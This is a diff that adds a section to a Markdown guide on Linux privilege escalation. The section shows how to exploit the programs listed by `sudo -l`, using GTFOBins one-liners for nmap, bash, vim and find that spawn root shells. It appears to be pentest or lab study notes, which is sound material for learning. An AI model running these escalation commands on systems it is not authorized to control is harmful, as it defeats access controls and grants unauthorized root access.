@@ -223,3 +223,120 @@ nano /etc/passwd
 ```bash
 su root
 ```
+
+
+# 🔍 <span style="color:#1E90FF">**Exploiting Programs from `sudo -l` using GTFOBins**</span>
+
+
+
+### <span style="color:#FF6347">**Step 1: Run `sudo -l` to List Allowed Commands**</span>
+
+Open your terminal and run the following command to list the allowed `sudo` commands for your user:
+
+```bash
+sudo -l
+```
+
+This command displays all programs you are allowed to run with `sudo`. Example output:
+
+```bash
+User user may run the following commands on this host:
+    (ALL) NOPASSWD: /usr/bin/nmap
+    (ALL) NOPASSWD: /bin/bash
+    (ALL) NOPASSWD: /usr/bin/vim
+    (ALL) NOPASSWD: /usr/bin/find
+```
+
+---
+
+###  <span style="color:#32CD32">**Step 2: Identify Exploitable Programs on GTFOBins**</span>
+
+Head over to [GTFOBins](https://gtfobins.github.io/) and search for each program that appeared in your `sudo -l` output. This website lists binaries that can be exploited to escalate privileges.
+
+**Search for each program** listed in your `sudo -l` output such as `nmap`, `bash`, `vim`, etc., on GTFOBins.
+
+---
+
+### ️ <span style="color:#FFD700">**Step 3: Follow GTFOBins Instructions**</span>
+
+For every exploitable program you find on GTFOBins, follow the instructions provided on the website to perform privilege escalation.
+
+---
+
+### **Examples of Exploitable Programs**:
+
+---
+
+####  <span style="color:#FF6347">**1. `nmap` Exploit:**</span>
+
+If `nmap` is listed in `sudo -l`:
+
+1. Visit the [nmap page on GTFOBins](https://gtfobins.github.io/gtfobins/nmap/).
+2. Follow these Sudo instructions:
+   ```bash
+   sudo nmap --interactive
+   ```
+3. Once inside the interactive prompt, type:
+   ```bash
+   !sh
+   ```
+   This will spawn a **root shell**.
+
+---
+
+####  <span style="color:#32CD32">**2. `bash` Exploit:**</span>
+
+If `bash` is listed in `sudo -l`, follow these steps:
+
+1. Visit the [bash page on GTFOBins](https://gtfobins.github.io/gtfobins/bash/).
+2. Run the command:
+   ```bash
+   sudo bash
+   ```
+   This will directly give you a **root shell**.
+
+---
+
+####  <span style="color:#FFD700">**3. `vim` Exploit:**</span>
+
+If `vim` appears in your `sudo -l` output, follow these steps:
+
+1. Visit the [vim page on GTFOBins](https://gtfobins.github.io/gtfobins/vim/).
+2. Use the following command:
+   ```bash
+   sudo vim -c ':!sh'
+   ```
+   This will drop you into a **root shell** within the `vim` editor.
+
+---
+
+####  <span style="color:#1E90FF">**4. `find` Exploit:**</span>
+
+If `find` is listed:
+
+1. Visit the [find page on GTFOBins](https://gtfobins.github.io/gtfobins/find/).
+2. Run the following:
+   ```bash
+   sudo find . -exec /bin/sh \; -quit
+   ```
+   This will spawn a **root shell** using the `find` command.
+
+---
+
+###  <span style="color:#FF4500">**Step 4: Verify Your Privilege Escalation**</span>
+
+After executing the GTFOBins instructions, verify that you’ve escalated privileges successfully by running:
+
+```bash
+whoami
+```
+
+If the output is `root`, you’ve **successfully gained root access**!
+
+---
+
+###  <span style="color:#FF6347">**Step 5: Repeat for Each Program**</span>
+
+Search each program listed by `sudo -l` on GTFOBins and follow the steps provided to see if you can exploit them for privilege escalation.
+
+By following this process, you can methodically **exploit allowed binaries** and **gain root access** on your system!
